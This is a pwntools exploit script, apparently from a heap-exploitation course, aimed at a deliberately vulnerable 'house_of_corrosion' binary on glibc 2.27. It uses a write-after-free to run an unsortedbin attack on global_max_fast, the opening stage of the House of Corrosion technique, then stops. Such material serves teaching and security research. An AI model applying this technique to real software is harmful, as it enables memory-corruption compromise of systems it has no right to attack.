#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_corrosion")
libc = ELF(elf.runpath + b"/.debug/libc-2.27.so", checksec=False)

gs = '''
set substitute-path /build/glibc-OTsEL5/glibc-2.27 ../.glibc/glibc_2.27_ubuntu1804
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.sendthen(b"size: ", b"1")
    io.sendthen(b"> ", f"{size}".encode())
    index += 1
    return index - 1

# Use malloc() helper to request a chunk of specific size.
# e.g. malloc_chunksize(0x420) requests a 0x420-sized chunk.
def malloc_chunksize(size):
    return malloc((size & ~0x0f) - 8)

# Select the "free" option; send index.
def free(index):
    io.sendthen(b"index: ", b"2")
    io.sendthen(b"> ", f"{index}".encode())

# Select the "edit" option; send index & data.
def edit(index, data):
    io.sendthen(b"index: ", b"3")
    io.sendthen(b"data: ", f"{index}".encode())
    io.sendthen(b"> ", data)

# Calculate chunk sizes used during global_max_fast corruption.
def gmf_chunksize(address):
    return (2 * (address - (libc.sym.main_arena + 0x10))) + 0x21 # 0x01 to ensure prev_inuse flag is set.

# Convenience function. Request a chunk with size calculated by gmf_chunksize().
def gmf_malloc(address):
    return malloc_chunksize(gmf_chunksize(address))

io = start()

# This binary does not leak any addresses.
io.recvuntil(b"> ")

# Guess the least-significant 4 bits of entropy from the libc load address.
if args.GDB:
    # When debugging ensure we "guess" correctly.
    libc.address = [io.libs()[lib] for lib in io.libs() if "/libc-2.27.so" in lib][0]  & 0xf000
    info(f"guessed entropy: 0x{libc.address:02x}")
else:
    # 0x00007f??????3000 and 0x00007f??????4000 are bad libc load addresses for this GLIBC build.
    libc.address = 0x7000

io.timeout = 0.1

# =============================================================================

# Request unsortedbin attack chunk & guard chunk.
unsortedbin_atk = malloc_chunksize(0x420)
malloc(0x18)

# Free "unsortedbin_atk" chunk into the unsortedbin.
free(unsortedbin_atk)

# Leverage write-after-free bug to modify unsortedbin_atk chunk's bk;
# point it at global_max_fast - 0x10.
edit(unsortedbin_atk, p64(0) + p16((libc.sym.global_max_fast & 0xffff) - 0x10))

# Trigger unsortedbin attack against global_max_fast.
malloc_chunksize(0x420)

# =============================================================================

io.interactive()
